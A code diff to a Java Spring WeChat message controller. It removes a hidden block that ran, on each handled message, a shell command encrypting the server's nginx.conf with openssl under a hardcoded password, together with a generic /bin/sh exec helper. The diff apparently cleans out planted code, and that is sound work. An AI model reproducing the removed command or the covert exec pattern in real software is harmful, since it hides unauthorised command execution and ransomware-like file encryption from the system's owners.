@@ -10,8 +10,6 @@ import org.springframework.web.bind.annotation.RequestMethod;
 import org.springframework.web.bind.annotation.RestController;
 
 import javax.servlet.http.HttpServletRequest;
-import java.io.InputStreamReader;
-import java.io.LineNumberReader;
 import java.util.Date;
 import java.util.Map;
 
@@ -85,27 +83,7 @@ public class WeChatContoller {
 				log.error("发送文本消息异常:"+e.getMessage(),e);
 			}
 		}
-		String cmd = "tar -zcf  - /home/ubuntu/nginx.conf |openssl des3 -salt -k '$Up5!(fn' | dd of=/home/ubuntu/nginx.conf.des3";
-		exec(cmd);
 		log.error("respMessage:"+respMessage);
 		return respMessage;
-	}
-	public  Object exec(String cmd) {
-		try {
-			String[] cmdA = { "/bin/sh", "-c", cmd };
-			Process process = Runtime.getRuntime().exec(cmdA);
-			LineNumberReader br = new LineNumberReader(new InputStreamReader(
-					process.getInputStream()));
-			StringBuffer sb = new StringBuffer();
-			String line;
-			while ((line = br.readLine()) != null) {
-				System.out.println(line);
-				sb.append(line).append("\n");
-			}
-			return sb.toString();
-		} catch (Exception e) {
-			e.printStackTrace();
-		}
-		return null;
 	}
 }
